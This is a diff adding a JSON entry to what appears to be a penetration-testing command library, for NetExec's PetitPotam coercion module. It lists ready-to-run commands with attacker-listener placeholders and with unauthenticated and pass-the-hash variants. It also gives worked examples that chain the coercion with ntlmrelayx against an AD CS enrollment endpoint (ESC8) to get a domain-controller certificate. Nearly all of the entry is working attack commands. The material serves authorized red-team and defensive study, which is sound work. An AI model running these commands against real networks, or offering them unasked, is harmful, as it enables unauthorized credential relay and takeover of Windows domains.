@@ -1,0 +1,22 @@
+{
+  "id": "nxc-smb-petitpotam",
+  "name": "NetExec PetitPotam Coercion",
+  "command": "nxc smb <ip> -u <user> -p <password> -M petitpotam -o LISTENER=<attacker_ip>",
+  "description": "Coerce a Windows host (typically a DC) to authenticate back to the attacker via the EFSRPC interface (PetitPotam). Pair with ntlmrelayx.py -t http://<ca>/certsrv/certfnh.asp for ESC8.",
+  "platform": "linux",
+  "requires": ["password"],
+  "protocols": ["smb", "rpc"],
+  "tags": ["nxc", "netexec", "petitpotam", "coercion", "ntlm-relay", "efsrpc"],
+  "variations": [
+    { "label": "Unauthenticated (Pre-Patch)", "requires": "no-creds", "command": "nxc smb <ip> -u '' -p '' -M petitpotam -o LISTENER=<attacker_ip>" },
+    { "label": "NTLM Hash", "requires": "hash", "command": "nxc smb <ip> -u <user> -H <hash> -M petitpotam -o LISTENER=<attacker_ip>" }
+  ],
+  "references": [
+    { "title": "NetExec — petitpotam module", "url": "https://www.netexec.wiki/smb-protocol/modules/petitpotam" },
+    { "title": "PetitPotam Original PoC", "url": "https://github.com/topotam/PetitPotam" }
+  ],
+  "examples": [
+    "nxc smb dc01.corp.local -u jdoe -p 'Password123!' -M petitpotam -o LISTENER=10.10.14.5",
+    "ntlmrelayx.py -t http://ca01.corp.local/certsrv/certfnh.asp --adcs --template DomainController"
+  ]
+}
